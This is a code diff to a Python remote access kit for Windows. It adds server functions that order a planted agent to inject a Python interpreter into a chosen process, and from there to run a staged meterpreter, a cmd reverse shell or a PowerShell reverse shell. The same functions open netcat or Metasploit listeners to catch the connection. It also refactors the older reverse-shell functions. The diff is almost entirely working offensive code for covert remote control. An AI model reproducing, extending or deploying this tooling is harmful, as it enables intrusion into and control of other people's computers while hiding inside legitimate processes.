@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.21
+# Build:  1.0.22
 # -------------------------------------------------------------
 import os
 
@@ -52,13 +52,20 @@ Define a class that will prepare, send and catch an msf shell based on the paylo
 """
 class Meterpreter():
 
+    #Function will instruct agent to inject a python meterpreter shell
+    def inject_exec_py_meter(self,client,encryption_key,process_name):
+        shell_code = PayloadCode().staged_python_meterpreter(SystemShell().listening_host,SystemShell().listening_port)     #Prepare shell code
+        ListenerHandler().open_meterpreter_listener(MSFPayload().staged_python_meterpreter,SystemShell().listening_port)    #Open listener
+        data = f'{ClientActionFlags().inject_python}{ClientActionFlags().seperator}{process_name}{ClientActionFlags().seperator}{shell_code}'
+        ServerSocket().send_data_to_client(client,encryption_key,data)                                                      #Send data to client
+
     #Function will send python meterpreter shellcode to client and open listener to catch connection
     def exec_python_meterpreter_shell(self,lport,encryption_key,client):
         domain = DNSconfigs().retrieve_domain_for_shell()           #Retrieve the domain chosen for shells
         shell_code = PayloadCode().staged_python_meterpreter(domain,lport)                              #Construct shellcode
         ListenerHandler().open_meterpreter_listener(MSFPayload().staged_python_meterpreter,lport)       #Open the listener
         data = str(f'{ClientActionFlags().exec_python_code}{ClientActionFlags().seperator}{shell_code}')#Prepare the data with the shell code
-        ServerSocket().send_data_to_client(client,encryption_key,data)                                  #Send the data to the client for execution
+        ServerSocket().send_data_to_client(client,encryption_key,data)                                 #Send the data to the client for execution
 
     #Function will create msf shellcode and injection stub with PID as param then send it to the agent for execution
     def inject_msf_payload(self,payload,process_id,encryption_key,client):
@@ -79,20 +86,39 @@ class Meterpreter():
 Define a class to prepare send and catch powershell shells
 """
 class SystemShell:
+    def __init__(self):
+        self.listening_host = DNSconfigs().retrieve_domain_for_shell()
+        self.listening_port = NetworkingConfigs().retrieve_shell_lport()
 
     #Function will execute a reverse shell using powershell
-    def exec_reverse_shell(self,lport,encryption_key,client):
-        lhost = DNSconfigs().retrieve_domain_for_shell()                                                        #Get the lhost from the config file
-        shell_code = PayloadCode().reverse_powershell(lhost, lport)                                             #Prepare the shellcode
-        ListenerHandler().open_netcat_listener(lport)                                                           #Open listener
+    def exec_reverse_shell(self,encryption_key,client):
+        shell_code = PayloadCode().reverse_powershell(self.listening_host, self.listening_port)                #Prepare the shellcode
+        ListenerHandler().open_netcat_listener(self.listening_port)                                            #Open listener
         data = str(f'{ClientActionFlags().system_command}{ClientActionFlags().seperator}{shell_code}')          #Prepare the data
         ServerSocket().send_data_to_client(client,encryption_key,data)                                          #Send the data to the client for execution
 
     #Function will execute a cmd prompt type reverse shell
     def exec_cmd_shell(self,client,encryption_key):
-        lhost = DNSconfigs().retrieve_domain_for_shell()                                                #Get the lhost string
-        lport = NetworkingConfigs().retrieve_shell_lport()                                              #Get the lport string
-        shellcode = PayloadCode().command_shell(lhost,lport)                                            #Create the code for the payload w/ the connection info
-        ListenerHandler().open_netcat_listener(lport)                                                   #Open a listener handler on the lport
+        shellcode = PayloadCode().command_shell(self.listening_host,self.listening_port)                #Create the code for the payload w/ the connection info
+        ListenerHandler().open_netcat_listener(self.listening_port)                                     #Open a listener handler on the lport
         data = str(f'{ClientActionFlags().exec_python_code}{ClientActionFlags().seperator}{shellcode}') #Create the data flag for the client
         ServerSocket().send_data_to_client(client,encryption_key,data)                                  #Send the flag to the client for processing
+
+    #Function will instruct agent to inject a python interpreter
+    #Into a process and then execute python code from that process
+    #That will give us a command shell
+    def inject_exec_CMD(self,client,encryption_key,process_name):
+        shell_code = PayloadCode().command_shell(self.listening_host,self.listening_port)       #Generate shell code string
+        ListenerHandler().open_netcat_listener(self.listening_port)                             #Open listener
+        data = str(f'{ClientActionFlags().inject_python}{ClientActionFlags().seperator}{process_name}{ClientActionFlags().seperator}{shell_code}')
+        ServerSocket().send_data_to_client(client,encryption_key,data)                          #Send data to agent
+
+    # Function will instruct agent to inject a python interpreter
+    # Into a process and then execute python code from that process
+    # That will give us a powershell shell
+    def inject_exec_PS(self, client, encryption_key, process_name):
+        code = str(PayloadCode().reverse_powershell(self.listening_host, self.listening_port)).replace("'","\\'")           #Make minor adjustments to payload code
+        shell_code = f'import subprocess;subprocess.run(\'{code}\',shell=True)'                                             #Prepare shellcode
+        ListenerHandler().open_netcat_listener(self.listening_port)                                                         #Open listener
+        data = str(f'{ClientActionFlags().inject_python}{ClientActionFlags().seperator}{process_name}{ClientActionFlags().seperator}{shell_code}')
+        ServerSocket().send_data_to_client(client, encryption_key, data)                                                    #Send data to the client
